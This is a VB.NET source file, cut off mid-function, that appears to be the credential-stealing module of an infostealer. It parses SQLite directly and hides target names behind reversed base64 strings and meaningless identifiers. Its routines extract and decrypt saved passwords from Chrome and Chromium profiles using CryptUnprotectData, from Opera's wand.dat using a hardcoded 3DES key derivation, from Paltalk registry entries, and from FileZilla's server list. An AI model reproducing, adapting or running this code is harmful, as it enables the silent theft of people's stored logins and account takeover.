Imports System.Runtime.InteropServices
Imports System.IO
Imports System.Net
Imports System.Text.RegularExpressions
Imports System.Text
Imports Microsoft.Win32
Imports System.Security.Principal

Class SiriTDecrypt

    Public Class Sk
        Public Shared Function Revpep(dgegeu As String) As String
            dgegeu = Encoding.Default.GetString(Convert.FromBase64String(dgegeu))
            Return String.Join(String.Empty, dgegeu.Reverse.Select(Function(d) d.ToString).ToArray)
        End Function
    End Class

    Private Class sqbskek
        Private DataBaseBytes As New List(Of Byte)
        Private FieldNames As New List(Of String)
        Private MTES As New List(Of SQLMasterEntry)
        Private TableEntries As New List(Of TableEntry)
        Private page_size, encoding As UShort
        Private SQLDataTypeSize As Byte() = {0, 1, 2, 3, 4, 6, 8, 8, 0, 0}
        Private enctouse As Encoding
#Region "Structures"
        Public Structure RecordHeaderField
            Public Size, Type As Long
        End Structure
        Public Structure TableEntry
            Public row_id As Long
            Public content As List(Of String)
        End Structure
        Public Structure SQLMasterEntry
            Public row_id, root_num As Long
            Public item_type, item_name, astable_name, sql_statement As String
        End Structure
#End Region


        Private Function IsOdd(value As Long) As Boolean
            Return (value And 1) = 1
        End Function
        Private Function GVL(st As Integer) As Integer
            If st + 8 > DataBaseBytes.Count Then Return -1

            For i As Integer = st To st + 7
                If i > DataBaseBytes.Count - 1 Then Return Nothing
                If (DataBaseBytes(i) And &H80) <> &H80 Then Return i
            Next
            Return st + 8
        End Function
        Private Function CVL(st As Integer, endIndex As Integer) As Long
            endIndex += 1

            Dim retus(7) As Byte
            Dim Length As Integer = endIndex - st


            If Length = 0 OrElse Length > 9 Then Return Nothing
            If Length = 1 Then
                retus(0) = CByte((DataBaseBytes(st) And &H7F))
                Return BitConverter.ToInt64(retus, 0)
            End If

            Dim Bit64 As Boolean = (Length = 9)

            Dim j As Integer = 1
            Dim k As Integer = 7
            Dim y As Integer = 0

            If Bit64 Then
                retus(0) = DataBaseBytes(endIndex - 1)
                endIndex -= 1
                y = 1
            End If

            For i As Integer = (endIndex - 1) To st Step -1
                If (i - 1) >= st Then
                    retus(y) = CByte(((DataBaseBytes(i) >> (j - 1)) And (&HFF >> j)) Or (DataBaseBytes(i - 1) << k))
                    j += 1
                    y += 1
                    k -= 1
                Else
                    If Not Bit64 Then retus(y) = CByte(((DataBaseBytes(i) >> (j - 1)) And (&HFF >> j)))
                End If
            Next

            Return BitConverter.ToInt64(retus, 0)
        End Function

        'Big Endian Conversation
        Private Function ConvertToUL(startIndex As Integer, Size As Integer) As ULong
            If Size > 8 OrElse Size = 0 Then Return Nothing
            Dim retVal As ULong = 0
            For i As Integer = 0 To Size - 1
                retVal = ((retVal << 8) Or DataBaseBytes(startIndex + i))
            Next
            Return retVal
        End Function

        Private Function DBisOk(T As Integer) As Boolean
            If MTES Is Nothing Then Return False
            Return MTES.Count > 0 AndAlso MTES.Count > T
        End Function



        Private Sub ReadMasterTable(Offset As Integer)

            If DataBaseBytes(Offset) = &HD Then 'Leaf node
                'Length for setting the array length for the entries
                Dim Length As UShort = CUShort(ConvertToUL(Offset + 3, 2) - 1)
                Dim ol As Integer = 0

                If Not MTES Is Nothing Then ol = MTES.Count

                Dim ent_offset As ULong

                For i As Integer = 0 To Length
                    ent_offset = ConvertToUL(Offset + 8 + (i * 2), 2)

                    If Offset <> 100 Then ent_offset = CULng(ent_offset + Offset)

                    'Table Cell auslesen
                    Dim t As Integer = GVL(CInt(ent_offset))
                    Dim size As Long = CVL(CInt(ent_offset), t)

                    Dim s As Integer = GVL(CInt(ent_offset + (t - ent_offset) + 1))


                    If DBisOk(ol + i) Then
                        Dim k As SQLMasterEntry = MTES(ol + i)
                        MTES.Remove(k)

                        k.row_id = CVL(CInt(ent_offset + (t - ent_offset) + 1), s)
                        MTES.Insert(ol + i, k)

                    Else
                        Dim te As New SQLMasterEntry With {.row_id = CVL(CInt(ent_offset + (t - ent_offset) + 1), s)}
                        If Not MTES.Contains(te) Then MTES.Add(te)
                    End If





                    'Table Content
                    'Resetting the offset
                    ent_offset = CULng(ent_offset + (s - ent_offset) + 1)

                    'Now get to the Record Header
                    t = GVL(CInt(ent_offset))
                    s = t
                    Dim Rec_Header_Size As Long = CVL(CInt(ent_offset), t) 'Record Header Length

                    Dim Field_Size(4) As Long

                    'Now get the field sizes and fill in the Values
                    For j As Integer = 0 To 4
                        t = s + 1
                        s = GVL(t)
                        Field_Size(j) = CVL(t, s)

                        If Field_Size(j) > 9 Then
                            If IsOdd(Field_Size(j)) Then Field_Size(j) = CLng((Field_Size(j) - 13) / 2) Else Field_Size(j) = CLng((Field_Size(j) - 12) / 2)
                        Else
                            Field_Size(j) = SQLDataTypeSize(CInt(Field_Size(j)))
                        End If
                    Next



                    If CUShort(encoding) = 1US Then enctouse = System.Text.Encoding.Default
                    If CUShort(encoding) = 2US Then enctouse = System.Text.Encoding.Unicode
                    If CUShort(encoding) = 3US Then enctouse = System.Text.Encoding.BigEndianUnicode



                    If DBisOk(ol + i) Then

                        Dim kk As SQLMasterEntry = MTES(ol + i)
                        MTES.Remove(kk)

                        kk.item_type = enctouse.GetString(DataBaseBytes.ToArray, CInt(ent_offset + Rec_Header_Size), CInt(Field_Size(0)))
                        kk.item_name = enctouse.GetString(DataBaseBytes.ToArray, CInt(ent_offset + Rec_Header_Size + Field_Size(0)), CInt(Field_Size(1)))
                        kk.sql_statement = enctouse.GetString(DataBaseBytes.ToArray, CInt(ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3)), CInt(Field_Size(4)))

                        MTES.Insert(ol + i, kk)
                    Else

                        Dim te As New SQLMasterEntry
                        te.item_type = enctouse.GetString(DataBaseBytes.ToArray, CInt(ent_offset + Rec_Header_Size), CInt(Field_Size(0)))
                        te.item_name = enctouse.GetString(DataBaseBytes.ToArray, CInt(ent_offset + Rec_Header_Size + Field_Size(0)), CInt(Field_Size(1)))
                        te.sql_statement = enctouse.GetString(DataBaseBytes.ToArray, CInt(ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3)), CInt(Field_Size(4)))
                        If Not MTES.Contains(te) Then MTES.Add(te)

                    End If




                    'MTES(ol + i).astable_name = encdef.GetString(DataBaseBytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1), Field_Size(2))

                    Dim kd As SQLMasterEntry = MTES(ol + i)
                    MTES.Remove(kd)

                    kd.root_num = CLng(ConvertToUL(CInt(ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2)), CInt(Field_Size(3))))
                    MTES.Insert(ol + i, kd)
                Next

            End If


            If DataBaseBytes(Offset) = &H5 Then 'internal node
                Dim ent_offset As UShort

                For i As Integer = 0 To CInt(ConvertToUL(Offset + 3, 2) - 1)
                    ent_offset = CUShort(ConvertToUL(Offset + 12 + (i * 2), 2))

                    If Offset = 100 Then ReadMasterTable(CInt((ConvertToUL(ent_offset, 4) - 1) * page_size)) Else ReadMasterTable(CInt((ConvertToUL(Offset + ent_offset, 4) - 1) * page_size))

                Next

                ReadMasterTable(CInt((ConvertToUL(Offset + 8, 4) - 1) * page_size))
            End If
        End Sub
        Private Function ReadTableFromOffset(Offset As Integer) As Boolean
            If DataBaseBytes(Offset) = &HD Then 'Leaf node

                'Length for setting the array length for the entries
                Dim b As Integer = CInt(ConvertToUL(Offset + 3, 2) - 1)
                If b < UShort.MinValue OrElse b > UShort.MaxValue Then Return False

                Dim Length As UShort = CUShort(ConvertToUL(Offset + 3, 2) - 1)
                Dim ol As Integer = 0

                If Not TableEntries Is Nothing Then ol = TableEntries.Count


                Dim ent_offset As ULong

                For i As Integer = 0 To Length
                    ent_offset = ConvertToUL(Offset + 8 + (i * 2), 2)

                    If Offset <> 100 Then ent_offset = CULng(ent_offset + Offset)

                    'Table Cell auslesen
                    Dim t As Integer = GVL(CInt(ent_offset))
                    Dim size As Long = CVL(CInt(ent_offset), t)

                    Dim s As Integer = GVL(CInt(ent_offset + (t - ent_offset) + 1))


                    Dim kee As New TableEntry With {.row_id = CVL(CInt(ent_offset + (t - ent_offset) + 1), s), .content = New List(Of String)}
                    TableEntries.Insert(ol + i, kee)


                    'Table Content
                    'Resetting the offset
                    ent_offset = CULng(ent_offset + (s - ent_offset) + 1)

                    'Now get to the Record Header
                    t = GVL(CInt(ent_offset))
                    s = t
                    Dim Rec_Header_Size As Long = CVL(CInt(ent_offset), t) 'Record Header Length

                    Dim Field_Size As RecordHeaderField() = {Nothing}
                    Dim size_read As Long = CLng((ent_offset - t) + 1)
                    Dim j As Integer = 0

                    'Now get the field sizes and fill in the Values
                    While size_read < Rec_Header_Size
                        ReDim Preserve Field_Size(j)

                        t = s + 1
                        s = GVL(t)
                        Field_Size(j).Type = CVL(t, s)

                        If Field_Size(j).Type > 9 Then

                            If IsOdd(Field_Size(j).Type) Then Field_Size(j).Size = CLng((Field_Size(j).Type - 13) / 2) Else Field_Size(j).Size = CLng((Field_Size(j).Type - 12) / 2)

                        Else
                            Field_Size(j).Size = SQLDataTypeSize(CInt(Field_Size(j).Type))
                        End If

                        size_read += (s - t) + 1
                        j += 1
                    End While


                    Dim counter As Integer = 0

                    For k As Integer = 0 To Field_Size.Length - 1
                        If Field_Size(k).Type > 9 Then
                            If Not IsOdd(Field_Size(k).Type) Then


                                If encoding = 1 Then enctouse = System.Text.Encoding.Default
                                If encoding = 2 Then enctouse = System.Text.Encoding.Unicode
                                If encoding = 2 Then enctouse = System.Text.Encoding.BigEndianUnicode


                                Dim tr As TableEntry = TableEntries(ol + i)
                                TableEntries.Remove(tr)

                                tr.content.Add(enctouse.GetString(DataBaseBytes.ToArray, CInt(ent_offset + Rec_Header_Size + counter), CInt(Field_Size(k).Size)))
                                TableEntries.Insert(ol + i, tr)

                            Else
                                Dim tr As TableEntry = TableEntries(ol + i)
                                TableEntries.Remove(tr)
                                tr.content.Add(System.Text.Encoding.Default.GetString(DataBaseBytes.ToArray, CInt(ent_offset + Rec_Header_Size + counter), CInt(Field_Size(k).Size)))

                                TableEntries.Insert(ol + i, tr)
                            End If


                        Else

                            Dim tr As TableEntry = TableEntries(ol + i)
                            TableEntries.Remove(tr)


                            tr.content.Add(CStr(ConvertToUL(CInt(ent_offset + Rec_Header_Size + counter), CInt(Field_Size(k).Size))))
                            TableEntries.Insert(ol + i, tr)
                        End If

                        counter += CInt(Field_Size(k).Size)
                    Next
                Next

            End If

            If DataBaseBytes(Offset) = &H5 Then 'internal node
                Dim Length As UShort = CUShort(ConvertToUL(Offset + 3, 2) - 1)
                Dim ent_offset As UShort

                For i As Integer = 0 To Length
                    ent_offset = CUShort(ConvertToUL(Offset + 12 + (i * 2), 2))
                    ReadTableFromOffset(CInt((ConvertToUL(Offset + ent_offset, 4) - 1) * page_size))
                Next

                ReadTableFromOffset(CInt((ConvertToUL(Offset + 8, 4) - 1) * page_size))
            End If

            Return True
        End Function

        ' Reads a complete table with all entries in it
        Public Function ReadTable(TableName As String) As Boolean
            ' First loop through sqlite_master and look if table exists

            If MTES Is Nothing Then Return False
            Dim found As Integer = MTES.ToList.FindIndex(Function(d) d.item_name.ToLower = TableName.ToLower)

            If found = -1 Then Return False

            Dim fields As String() = MTES(found).sql_statement.Substring(MTES(found).sql_statement.IndexOf("(") + 1).Split(CChar(","))

            For i As Integer = 0 To fields.Length - 1
                fields(i) = CStr(fields(i)).TrimStart

                Dim index As Integer = fields(i).IndexOf(" ")

                If index > 0 Then fields(i) = fields(i).Substring(0, index)

                If fields(i).IndexOf("UNIQUE") = 0 Then Exit For

                If FieldNames.Count > i Then FieldNames.RemoveAt(i)
                FieldNames.Insert(i, fields(i))
            Next
            Return ReadTableFromOffset(CInt((MTES(found).root_num - 1) * page_size))
        End Function

        ' Returns the row count of current table
        Public Function GetRowCount() As Integer
            If TableEntries Is Nothing Then Return -1
            Return TableEntries.Count
        End Function
        Public Function GetTableNames() As String()
            If MTES Is Nothing Then Return {}
            Return MTES.Where(Function(d) d.item_type = "table").Select(Function(w) w.item_name).ToArray
        End Function
        ' Returns a Value from current table in row row_num with field name field
        Public Function GetValue(a As Integer, b As String) As String

            Dim found As Integer = FieldNames.ToList.FindIndex(Function(d) d.ToLower.Equals(b.ToLower))
            If found = -1 Then Return String.Empty

            Dim Gv As Func(Of Integer, Integer, String) = Function(x As Integer, y As Integer)
                                                              If x >= TableEntries.Count Then Return String.Empty
                                                              If y >= TableEntries(x).content.Count Then Return String.Empty

                                                              Return TableEntries(x).content(y)
                                                          End Function

            Return Gv(a, found)
        End Function

        Public Sub New(baseName As String)

            'Page Number n is page_size*(n-1)
            If Not File.Exists(baseName) Then Exit Sub
            DataBaseBytes = ReadAsByte(baseName).Select(Function(d) d).ToList

            If System.Text.Encoding.Default.GetString(DataBaseBytes.ToArray, 0, 15).CompareTo("SQLite format 3") <> 0 Then Exit Sub

            If DataBaseBytes(52) <> 0 Then Exit Sub
            'If ConvertToUL(44, 4) >= 4 Then Exit Sub

            page_size = CUShort(ConvertToUL(16, 2))
            encoding = CUShort(ConvertToUL(56, 4))

            If encoding = 0 Then encoding = 1

            ReadMasterTable(100)

        End Sub
    End Class





#Region "General functions and structures"
    Public Structure daeepskwpsk
        Public ap, ur, ac, pa As String
        Public Sub New(ApN As String, U As String, A As String, P As String)
            ap = ApN
            ur = U
            ac = A
            pa = P
        End Sub
    End Structure
    Private Shared Function Isaekep(D As daeepskwpsk) As Boolean
        Dim k As New List(Of Boolean) From {D.ac Is Nothing, D.pa Is Nothing}
        If k.Contains(True) Then Return False
        Return D.ac.Length > 0 AndAlso D.pa.Length > 0
    End Function
    Private Shared Function ReadAsString(Pa As String, Encod As Encoding) As String
        Dim b As Byte() = ReadAsByte(Pa)
        If b.Equals(Convert.ToByte(False)) Then Return String.Empty
        Return Encod.GetString(b)
    End Function
    Private Shared Function ReadAsByte(Pa As String) As Byte()
        If Not File.Exists(Pa) Then Return {Convert.ToByte(False)}
        Dim PS As Byte() = {Convert.ToByte(False)}
        Try
            Dim fs As FileStream = File.Open(Pa, FileMode.Open, FileAccess.Read, FileShare.ReadWrite)
            Using sw As BinaryReader = New BinaryReader(fs)
                PS = sw.ReadBytes(CInt(fs.Length))
            End Using
        Catch
        End Try
        Return PS
    End Function
    <DllImport("Crypt32.Dll", SetLastError:=True, CharSet:=System.Runtime.InteropServices.CharSet.Auto)>
    Private Shared Function CryptUnprotectData(ByRef pDataIn As DATA_BLOB, szDataDescr As String, ByRef pOptionalEntropy As DATA_BLOB, pvReserved As IntPtr, ByRef pPromptStruct As CRYPTPROTECT_PROMPTSTRUCT, dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Boolean
    End Function
    <DllImport("Kernel32.Dll", SetLastError:=True, ExactSpelling:=True)> Public Shared Function LocalFree(hMem As IntPtr) As IntPtr
    End Function
    <Flags()> Private Enum CryptProtectPromptFlags
        CRYPTPROTECT_PROMPT_ON_UNPROTECT = &H1
        CRYPTPROTECT_PROMPT_ON_PROTECT = &H2
    End Enum
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Private Structure CRYPTPROTECT_PROMPTSTRUCT
        Public cbSize As Integer
        Public dwPromptFlags As CryptProtectPromptFlags
        Public hwndApp As IntPtr
        Public szPrompt As String
    End Structure
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Private Structure DATA_BLOB
        Public cbData As Integer
        Public pbData As IntPtr
    End Structure

    Private Shared Function Getdaeepskwpsk(P As String(), n As String) As List(Of daeepskwpsk)
        Dim DecryptData As Func(Of Byte(), String) = Function(Data As Byte())
                                                         Dim dataIn, dataOut As DATA_BLOB
                                                         Dim gchDataIn As GCHandle = GCHandle.Alloc(Data, GCHandleType.Pinned)
                                                         dataIn.pbData = gchDataIn.AddrOfPinnedObject()
                                                         dataIn.cbData = Data.Length
                                                         CryptUnprotectData(dataIn, String.Empty, Nothing, IntPtr.Zero, Nothing, 0, dataOut)
                                                         gchDataIn.Free()
                                                         Dim retval As String = Marshal.PtrToStringAnsi(dataOut.pbData, dataOut.cbData)
                                                         LocalFree(dataOut.pbData)
                                                         Return retval
                                                     End Function


        Dim AllA As New List(Of daeepskwpsk)

        For Each pa As String In P
            Dim D As sqbskek = New sqbskek(pa)
            D.ReadTable(Sk.Revpep("c25pZ29s"))
            If Not File.Exists(pa) Then Return AllA



            For i As Integer = 0 To D.GetRowCount() - 1
                Dim L As New daeepskwpsk(n, D.GetValue(i, Sk.Revpep("bHJ1X25pZ2lybw==")), D.GetValue(i, Sk.Revpep("ZXVsYXZfZW1hbnJlc3U=")), DecryptData(Encoding.Default.GetBytes(D.GetValue(i, Sk.Revpep("ZXVsYXZfZHJvd3NzYXA=")))))
                If Not AllA.Contains(L) AndAlso Isaekep(L) Then AllA.Add(L)
            Next
        Next

        Return AllA
    End Function
#End Region


    Class chroachroejeiep
        'Also Supports CoolNovo,Rockmelt,Dragon,Flock,Iron
        Public Enum brkw As Short
            gchr = 1
            chroep = 2
            Both = 3
        End Enum
        Public Function GetProfiles(TE As brkw) As List(Of String)
            Dim ChrBasePat As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), Sk.Revpep("ZWxnb29H"), Sk.Revpep("ZW1vcmhD"), Sk.Revpep("YXRhRCByZXNV"))

            If TE = brkw.chroep Then ChrBasePat = ChrBasePat.Replace(Sk.Revpep("ZW1vcmhDXGVsZ29vRw=="), Sk.Revpep("bXVpbW9yaEM="))

            If Not Directory.Exists(ChrBasePat) Then Return New List(Of String)

            Dim PatList As New List(Of String)



            Dim pds As String() = Directory.GetDirectories(ChrBasePat).Where(Function(t) Regex.IsMatch(t, Sk.Revpep("K2RcIGVsaWZvclA="))).Select(Function(w) Path.Combine(ChrBasePat, w)).ToArray
            PatList.AddRange(pds)

            Dim DefPat As String = Path.Combine(ChrBasePat, "Default")
            If Directory.Exists(DefPat) Then PatList.Add(DefPat)

            Return PatList
        End Function



        Public Function ReadData(BrowserType As brkw) As List(Of daeepskwpsk)
            Dim Al As New List(Of daeepskwpsk)

            Dim ReadChrdkekBas As Action = Sub()
                                               Dim Passfilez As String() = GetProfiles(brkw.chroep).Select(Function(d) Path.Combine(d, Sk.Revpep("YXRhRCBuaWdvTA=="))).ToArray
                                               Al.AddRange(Getdaeepskwpsk(Passfilez, Sk.Revpep("bXVpbW9yaEM=")).ToArray)
                                           End Sub

            Dim ReadGChrbas As Action = Sub()
                                            Dim Passfilez As String() = GetProfiles(brkw.gchr).Select(Function(d) Path.Combine(d, Sk.Revpep("YXRhRCBuaWdvTA=="))).ToArray
                                            Al.AddRange(Getdaeepskwpsk(Passfilez, Sk.Revpep("ZW1vcmhDIGVsZ29vRw==")).ToArray)
                                        End Sub


            If BrowserType = brkw.Both Then
                ReadGChrbas()
                ReadChrdkekBas()
            End If

            If BrowserType = brkw.chroep Then ReadChrdkekBas()
            If BrowserType = brkw.gchr Then ReadGChrbas()

            Return Al
        End Function

    End Class
    Class chroNew
        Public Function ReadData() As List(Of daeepskwpsk)
            Dim ChrBasePatInfo As DirectoryInfo = New DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), Sk.Revpep("ZWxnb29H"), Sk.Revpep("ZW1vcmhD"), Sk.Revpep("YXRhRCByZXNV")))
            Dim ChrProfiles As List(Of FileInfo) = ChrBasePatInfo.GetDirectories(Sk.Revpep("KiBlbGlmb3JQ"), SearchOption.TopDirectoryOnly).Select(Function(d) New FileInfo(Path.Combine(d.FullName, Sk.Revpep("YXRhRCBuaWdvTA==")))).ToList()
            ChrProfiles.Add(New FileInfo(Path.Combine(ChrBasePatInfo.FullName, Sk.Revpep("dGx1YWZlRA=="), Sk.Revpep("YXRhRCBuaWdvTA=="))))

            Return Getdaeepskwpsk(ChrProfiles.Select(Function(d) d.FullName).ToArray(), Sk.Revpep("ZW1vcmhDIGVsZ29vRw=="))
        End Function
    End Class
    Class opdecnieo
        Public Function ReadData() As List(Of daeepskwpsk)
            Dim OpPat As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Sk.Revpep("ZXJhd3Rmb1MgYXJlcE8="), Sk.Revpep("ZWxiYXRTIGFyZXBP"), Sk.Revpep("YXRhRCBuaWdvTA=="))
            Return Getdaeepskwpsk({OpPat}, Sk.Revpep("ZWxiYXRTIGFyZXBP"))
        End Function
    End Class
    Class opeushzezam
        Public Function ReadData() As List(Of daeepskwpsk)
            Dim MD5 As Func(Of Byte(), Byte()) = Function(inp As Byte())
                                                     Return New System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(inp)
                                                 End Function



            Dim Decrypt As Func(Of Byte(), Byte(), String) = Function(key As Byte(), data As Byte())

                                                                 Dim Salt As Byte() = {&H83, &H7D, &HFC, &HF, &H8E, &HB3, &HE8, &H69, &H73, &HAF, &HFF}

                                                                 Dim A As Byte() = MD5(Salt.Concat(key).ToArray())
                                                                 Dim BB As Byte() = MD5(A.Concat(Salt).Concat(key).ToArray())

                                                                 Dim triDes As New System.Security.Cryptography.TripleDESCryptoServiceProvider()
                                                                 triDes.Mode = System.Security.Cryptography.CipherMode.CBC
                                                                 triDes.Padding = System.Security.Cryptography.PaddingMode.Zeros

                                                                 triDes.Key = A.Concat(BB.Take(8)).ToArray()
                                                                 triDes.IV = BB.Skip(8).Take(8).ToArray()

                                                                 Dim rawData As Byte() = triDes.CreateDecryptor().TransformFinalBlock(data, 0, data.Length)
                                                                 Dim ClData As String = System.Text.Encoding.Unicode.GetString(rawData).TakeWhile(Function(c) System.Convert.ToInt16(c) > 0).ToArray
                                                                 Return ClData

                                                             End Function



            Dim AllA As New List(Of daeepskwpsk)

            Dim Pat As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
            If File.Exists(Path.Combine(Pat, Sk.Revpep("dGFkLmRuYXdcYXJlcE9cYXJlcE8="))) Then
                Pat = Path.Combine(Pat, Sk.Revpep("dGFkLmRuYXdcYXJlcE9cYXJlcE8="))
            ElseIf File.Exists(Path.Combine(Pat, Sk.Revpep("dGFkLmRuYXdcZWxpZm9ycFxhcmVwT1xhcmVwTw=="))) Then
                Pat = Path.Combine(Pat, Sk.Revpep("dGFkLmRuYXdcZWxpZm9ycFxhcmVwT1xhcmVwTw=="))
            End If
            Dim B As New List(Of String)

            Dim WaneD As Byte() = New Byte() {Convert.ToByte(False)}

            WaneD = ReadAsByte(Pat)


            If WaneD.Length = 0 Then Return AllA

            For i As Integer = 0 To WaneD.Length - 5
                If WaneD(i) = &H0 AndAlso WaneD(i + 1) = &H0 AndAlso WaneD(i + 2) = &H0 AndAlso WaneD(i + 3) = &H8 Then
                    Dim BSize As Integer = CInt(WaneD(i + 15))
                    Dim Key As Byte() = New Byte(7) {}
                    Dim EncryptData As Byte() = New Byte(BSize - 1) {}
                    Array.Copy(WaneD, i + 4, Key, 0, Key.Length)
                    Array.Copy(WaneD, i + 16, EncryptData, 0, EncryptData.Length)
                    B.Add(Decrypt(Key, EncryptData))
                    i += 11 + BSize
                End If
            Next
            Dim Site As String = String.Empty
            Dim Acc As String = String.Empty
            Dim Pass As String = String.Empty
            For i As Integer = 7 To B.Count - 1
                If B(i) = "login" Then
                    Site = B(i - 2)
                    Acc = B(i + 1)
                    Pass = B(i + 3)
                    If Pass.Length > 5 Then Pass = Pass.Replace(Pass(Pass.Length - 1), String.Empty).Replace(Pass(Pass.Length - 2), String.Empty)
                End If


                If Site.Length > 6 AndAlso Acc.Length > 0 AndAlso Pass.Length > 0 Then
                    Dim L As New daeepskwpsk(Sk.Revpep("YXJlcE8="), Site, Acc, Pass)
                    If Not AllA.Contains(L) AndAlso Isaekep(L) Then AllA.Add(L)
                End If
            Next
            Return AllA
        End Function
    End Class
    Class pajkejekd
        Public Structure PalDecDat
            Public ValOne, ValTwo As String
            Public Sub New(A As String, B As String)
                ValOne = A
                ValTwo = B
            End Sub
        End Structure
        Public Function Decrypt(Dat As List(Of PalDecDat)) As List(Of daeepskwpsk)
            Dim AllA As New List(Of daeepskwpsk)

            Dim GetHDSerial As Func(Of String) = Function()

                                                     Dim Vals As New List(Of Object)

                                                     Try
                                                         Using disk As New System.Management.ManagementObject("Win32_LogicalDisk.DeviceID=""C:""")
                                                             Vals.Add(disk.Properties("VolumeSerialNumber").Value.ToString())
                                                         End Using
                                                     Catch
                                                     End Try


                                                     Try
                                                         Using p As New Process()
                                                             p.StartInfo = New ProcessStartInfo With {
                                                                    .FileName = "cmd",
                                                                    .RedirectStandardInput = True,
                                                                    .RedirectStandardOutput = True,
                                                                    .CreateNoWindow = True,
                                                                    .UseShellExecute = False}
                                                             p.Start()
                                                             p.StandardInput.WriteLine(String.Concat("vol C: ", Environment.UserName))
                                                             p.StandardInput.WriteLine("exit")
                                                             Do
                                                                 Dim line As String = p.StandardOutput.ReadLine
                                                                 If line Is Nothing Then Exit Do
                                                                 If line.ToLower.Contains("volumeseriennummer") Then
                                                                     Vals.Add(String.Join(String.Empty, line.Skip(21).Select(Function(d) d.ToString)).Replace("-", String.Empty))
                                                                 End If
                                                             Loop
                                                         End Using
                                                     Catch
                                                     End Try



                                                     Dim SubK As RegistryKey = Nothing
                                                     Using Bk As RegistryKey = RegistryKey.OpenBaseKey(RegistryHive.Users, RegistryView.Default)
                                                         Dim T As String() = Bk.GetSubKeyNames()
                                                         Dim Ke As String = String.Concat(DirectCast(New NTAccount(Environment.UserName).Translate(GetType(SecurityIdentifier)), SecurityIdentifier), "_Classes")

                                                         SubK = Bk.OpenSubKey(String.Concat(Ke, "\Wow6432Node\CLSID"), RegistryKeyPermissionCheck.ReadSubTree)
                                                         If SubK Is Nothing Then Vals.Add(Nothing)

                                                         T = SubK.GetSubKeyNames.Distinct.ToArray

                                                         If T.Count = 0 Then Vals.Add(Nothing)

                                                         Dim Finn As String = T.SingleOrDefault(Function(wz) Bk.OpenSubKey(String.Concat(Ke, "\Wow6432Node\CLSID\", wz), RegistryKeyPermissionCheck.ReadSubTree).GetSubKeyNames.Contains("Version"))

                                                         SubK.Close()
                                                         Vals.Add(Regex.Match(Finn, "{([^-]+)").Groups(1).Value.ToUpper)
                                                     End Using



                                                     Return Vals.Distinct.SingleOrDefault(Function(d) TypeOf d Is String AndAlso d.ToString.Length > 5).ToString
                                                 End Function

            Dim ser As Char() = GetHDSerial().ToCharArray





            Dat.ForEach(Sub(Ni)

                            Dim t, o As Integer

                            Dim chr As Char() = Ni.ValTwo.ToCharArray
                            Dim passarr As New List(Of String)



                            While t < chr.GetUpperBound(0)
                                passarr.Add(String.Concat(chr(t), chr(t + 1), chr(t + 2)))
                                t += 4
                                o += 1
                            End While



                            Dim key As String = String.Empty

                            For i As Integer = 0 To Ni.ValOne.Count - 1
                                key &= Ni.ValOne(i)
                                If i <= ser.GetUpperBound(0) Then key &= ser(i)
                            Next

                            key = String.Join(String.Empty, Enumerable.Repeat(key, 3).Select(Function(d) d.ToString).ToArray)
                            Dim Chhh As Char() = key.ToCharArray



                            Dim k As Integer = CInt(passarr(0)) - 122 - CInt(Encoding.ASCII.GetBytes(key.Substring(key.Length - 1, 1))(0))

                            If k <= 65 Then k += 1

                            Dim Pazz As String = Convert.ToChar(k)

                            For x As Integer = 1 To passarr.ToArray.GetUpperBound(0)

                                If Not passarr(x) Is Nothing Then
                                    Dim te As Integer = CInt(Encoding.ASCII.GetBytes(Chhh(x - 1))(0))
                                    Pazz &= Convert.ToChar(CInt(passarr(x)) - x - te - 122)
                                End If
                            Next

                            Dim L As New daeepskwpsk(Sk.Revpep("a2xhdGxhUA=="), String.Empty, Ni.ValOne, Pazz)
                            If Not AllA.Contains(L) AndAlso Isaekep(L) Then AllA.Add(L)



                        End Sub)

            Return AllA
        End Function
        Public Function ReadData() As List(Of daeepskwpsk)
            Dim AllA As New List(Of daeepskwpsk)

            Dim Users As New List(Of PalDecDat)

            Dim SubK As RegistryKey = Nothing

            Using Bk As RegistryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default)
                SubK = Bk.OpenSubKey(Sk.Revpep("a2xhdGxhUFxlcmF3dGZvUw=="), RegistryKeyPermissionCheck.ReadSubTree)
                If SubK Is Nothing Then Return AllA

                Dim k As String() = SubK.GetSubKeyNames
                If k.Count = 0 Then Return AllA


                For Each w As String In k
                    SubK = Bk.OpenSubKey(String.Concat(Sk.Revpep("XGtsYXRsYVBcZXJhd3Rmb1M="), w))

                    If Not SubK.GetValue(Sk.Revpep("ZHdw")) Is Nothing Then
                        Dim L As New PalDecDat(w, SubK.GetValue(Sk.Revpep("ZHdw")).ToString)
                        If L.ValOne.Length > 0 AndAlso L.ValTwo.Length > 0 AndAlso Not Users.Contains(L) Then Users.Add(L)
                    End If
                Next

                SubK.Close()
            End Using


            AllA = Decrypt(Users)

            Return AllA
        End Function

    End Class
    Class fixkavwc
        'Works (Version 3.11.0)
        Public Function ReadData() As List(Of daeepskwpsk)
            Dim AllA As New List(Of daeepskwpsk)
            Dim Pat As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Sk.Revpep("YWxsaVplbGlG"), Sk.Revpep("bG14LnNyZXZyZXN0bmVjZXI="))
            If File.Exists(Pat) Then
                Dim S As String = File.ReadAllText(Pat, System.Text.Encoding.UTF8)
                For Each p As Match In Regex.Matches(S, "Host>([^<]+)</Host>\s+<Po.+\s+<Pro.+\s+<Ty.+\s+<User>([^<]+).+\s+<Pass [^>]+>(.+?)</Pass>")
                    Dim Server As String = p.Groups(1).Value
                    Dim Acc As String = p.Groups(2).Value
                    Dim Pass As String = Encoding.Default.GetString(Convert.FromBase64String(p.Groups(3).Value))
                    If Not Server.Length = 0 AndAlso Not Acc.Length = 0 AndAlso Not Pass.Length = 0 Then
